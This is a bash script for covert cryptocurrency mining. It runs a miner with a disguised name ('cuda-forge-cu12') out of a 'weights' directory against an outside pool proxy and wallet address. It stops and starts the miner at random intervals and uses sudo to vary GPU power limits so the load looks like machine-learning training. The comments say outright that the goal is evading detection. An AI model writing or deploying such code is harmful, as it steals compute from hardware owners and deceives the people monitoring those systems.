#!/bin/bash
# Stealth mining: random cycles with GPU throttling
# Mimics bursty ML training patterns

cd "$(dirname "$0")/weights"

PROXY="global.pearlfortune.org:443"
ADDRESS="prl1par2eef0c04z6s6fhlzx6setjh5xqv8et50ufsty5zhywqjghwuwq6p085p"
BINARY="./cuda-forge-cu12"

# GPU power limits (alternating to look like training)
POWER_LOW=200   # ~40% - like data loading/preprocessing
POWER_HIGH=400  # ~80% - like forward/backward pass
POWER_FULL=600  # ~90% - like gradient computation

echo "=== Stealth Mining Started ==="
echo "Pattern: random bursts (4-8 min mine, 1-3 min rest)"

while true; do
    # Random mine duration: 240-480 seconds (4-8 min)
    MINE_TIME=$(( RANDOM % 240 + 240 ))
    
    # Random rest duration: 60-180 seconds (1-3 min)
    REST_TIME=$(( RANDOM % 120 + 60 ))
    
    echo "[$(date +%H:%M:%S)] Mining for ${MINE_TIME}s..."
    
    # Set GPU to high power
    sudo nvidia-smi -pl $POWER_HIGH 2>/dev/null
    
    # Launch miner
    LD_LIBRARY_PATH=./lib:$LD_LIBRARY_PATH $BINARY \
        --proxy $PROXY \
        --address $ADDRESS \
        --worker $(hostname) \
        -gpu &
    PID=$!
    
    # Random power fluctuations during mining (every 30-60s)
    ELAPSED=0
    while [ $ELAPSED -lt $MINE_TIME ]; do
        sleep $(( RANDOM % 30 + 30 ))
        ELAPSED=$(( ELAPSED + 30 ))
        
        # Randomly change GPU power (mimics training phases)
        PHASE=$(( RANDOM % 3 ))
        if [ $PHASE -eq 0 ]; then
            sudo nvidia-smi -pl $POWER_LOW 2>/dev/null
        elif [ $PHASE -eq 1 ]; then
            sudo nvidia-smi -pl $POWER_HIGH 2>/dev/null
        else
            sudo nvidia-smi -pl $POWER_FULL 2>/dev/null
        fi
    done
    
    # Kill miner
    kill $PID 2>/dev/null
    pkill -f cuda-forge 2>/dev/null
    wait $PID 2>/dev/null
    
    # Set GPU to idle power
    sudo nvidia-smi -pl $POWER_LOW 2>/dev/null
    
    echo "[$(date +%H:%M:%S)] Resting for ${REST_TIME}s..."
    sleep $REST_TIME
done
